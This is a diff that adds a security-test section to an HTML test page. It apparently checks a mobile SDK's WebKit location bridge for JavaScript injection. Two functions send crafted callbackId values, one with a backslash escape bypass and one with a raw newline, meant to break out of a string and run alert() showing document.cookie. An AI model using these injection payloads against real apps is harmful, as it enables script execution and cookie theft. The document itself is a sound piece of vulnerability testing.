@@ -81,6 +81,47 @@
 
   <h2>Embedded Website</h2>
 <div style="max-width: 1000px; margin: 20px auto;">
+
+  <hr>
+<h2 style="color:red;">SECURITY TESTS</h2>
+
+<div class="settings-section" style="border-color:red;">
+  <h3 style="color:red;">C-02: JS Injection — Backslash Escape Bypass</h3>
+  <p>Sends a malicious <code>callbackId</code> with a backslash to the location bridge.
+  The SDK escapes <code>'</code> but NOT <code>\</code>, so the string breaks out.</p>
+
+  <p><b>Payload:</b> <code>\'; alert("C02_INJECTED: "+document.cookie); //</code></p>
+
+  <button class="btn" onclick="testC02_backslashInjection()">Test C-02: Backslash Injection</button>
+  <button class="btn" onclick="testC02_newlineInjection()">Test C-02: Newline Injection</button>
+  <div class="status-box" id="c02Status">—</div>
+</div>
+
+<script>
+  // C-02 Test A — backslash escape bypass
+  // The callbackId \'; alert(...); // after SDK escaping becomes:
+  //   '\\'  → closes the string, then alert() executes freely
+  function testC02_backslashInjection() {
+    document.getElementById('c02Status').textContent = 'Sent. Watch for alert() popup — if it fires, injection is confirmed.';
+    const maliciousCallbackId = "\\'; alert('C02_INJECTED: ' + document.cookie); //";
+    window.webkit.messageHandlers.getCurrentLocation.postMessage({
+      "scriptName": "getCurrentLocation",
+      "callbackId": maliciousCallbackId
+    });
+  }
+
+  // C-02 Test B — raw newline injection
+  // The \n breaks out of the JS string literal
+  function testC02_newlineInjection() {
+    document.getElementById('c02Status').textContent = 'Sent. Watch for alert() — if it fires, newline injection confirmed.';
+    const newlinePayload = "legit_id\n'; alert('C02_NEWLINE_INJECTED'); //";
+    window.webkit.messageHandlers.getCurrentLocation.postMessage({
+      "scriptName": "getCurrentLocation",
+      "callbackId": newlinePayload
+    });
+  }
+</script>
+
   <iframe
     src="https://jupiter.0xc3.pw/hiteshkumarthakur.github.io/"
     title="Embedded Site"
